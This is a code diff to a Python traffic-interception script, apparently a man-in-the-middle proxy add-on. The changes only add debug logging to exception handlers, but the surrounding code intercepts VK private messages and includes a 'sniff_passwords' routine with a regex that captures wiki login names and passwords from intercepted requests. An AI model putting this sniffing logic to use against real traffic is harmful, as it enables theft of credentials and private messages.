@@ -109,8 +109,10 @@ class VK_data:
     def decode_request(self, string):
         try:
             string = urllib.unquote(string).decode('utf-8')
-        except:
-            pass
+        except Exception as e:
+            logging.debug("Exception in 'decode_request':") 
+            logging.debug(e)
+
         m = re.match(r"act=(?P<type>\w+)&\w+", string)
         if not m:
             return [0]
@@ -183,8 +185,9 @@ class VK_data:
     def decode_java(self, string):
         try:
             string = urllib.unquote(string).decode('utf-8')
-        except:
-            pass
+        except Exception as e:
+            logging.debug("Exception in 'decode_java':") 
+            logging.debug(e)
 
         m = re.match((r"code=var mid = API.messages.send\(\{\"peer_id\":(?P<to>\d+),\"message\":\"(?P<msg>[\w\W]*)\"," +
                        "\"type\":\"(?P<type>[\w\W]*)\",\"guid\":(?P<guid>\d+),\"attachment\":(?P<att>[\w\W]*)"), string)
@@ -224,8 +227,9 @@ class PW_data:
 
         try:
             string = urllib.unquote(string).decode('utf-8')
-        except:
-            pass
+        except Exception as e:
+            logging.debug("Exception in 'sniff_passwords':") 
+            logging.debug(e)
 
         # Wiki 
         m = re.match(r"wpName=(?P<login>[^&]*)&wpPassword=(?P<password>[^&]*)&[\w\W]*", string)
@@ -322,6 +326,7 @@ def request(context, flow):
             
 
     except Exception as e:
+        logging.debug("Exception in 'request':")
         logging.debug(e)
 
 def response(context, flow):
@@ -333,6 +338,7 @@ def response(context, flow):
         
 
     except Exception as e:
+        logging.debug("Exception in 'response':")
         logging.debug(e)
 
 def start (context, argv):
